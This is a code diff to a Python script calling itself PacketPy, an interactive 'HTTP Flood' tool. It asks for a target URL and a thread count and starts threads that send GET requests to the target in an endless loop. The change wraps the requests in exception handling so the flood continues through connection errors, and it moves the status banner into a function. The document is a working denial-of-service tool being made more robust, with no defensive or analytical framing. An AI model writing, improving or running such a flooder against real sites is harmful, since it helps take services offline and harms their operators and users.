@@ -27,7 +27,11 @@ input("Press ENTER to continue ")
 print("")
 def dos(target):
     while True:
-            res = requests.get(url)        
+        try:
+            res = requests.get(url)
+        except requests.exceptions.ConnectionError:
+            clearterminal()
+            printinfo()
 threads = 20        
 url = input("Target URL [https://example.com]: ")
 if not url.__contains__("http") or not url.__contains__(".") or not url.__contains__("://"):
@@ -41,24 +45,25 @@ except ValueError:
 if threads == 0:
     exit("Minimum [1]")
 clearterminal()
-print("-----------------------------------------")
-print("")
-print(" -=- HTTP payload in progress.. -=-")
-print("")
-print("")
-print("- Target URL: " + str(url)+ " -")
-print("- HTTP Payload size: Random")
-print("- OS: " + str(os.name) + " -")
-print("- PacketPy version: " + str(version) + " -")
-print("")
-print("PacketPy, an open-source")
-print("network tool library, written in")
-print("Python.")
-print("")
-print("Interactive mode (HTTP Flood)")
-print("")
-print("---> Press CTRL+C to stop the payload!")
-print("-----------------------------------------")
+def printinfo():
+    print("-----------------------------------------")
+    print("")
+    print(" -=- HTTP payload in progress.. -=-")
+    print("")
+    print("")
+    print("- Target URL: " + str(url)+ " -")
+    print("- HTTP Payload size: Random")
+    print("- OS: " + str(os.name) + " -")
+    print("- PacketPy version: " + str(version) + " -")
+    print("")
+    print("PacketPy, an open-source")
+    print("network tool library, written in")
+    print("Python.")
+    print("")
+    print("Interactive mode (HTTP Flood)")
+    print("")
+    print("---> Press CTRL+C to stop the payload!")
+    print("-----------------------------------------")
 
 for i in range(0, threads):
     thr = threading.Thread(target=dos, args=(url,))
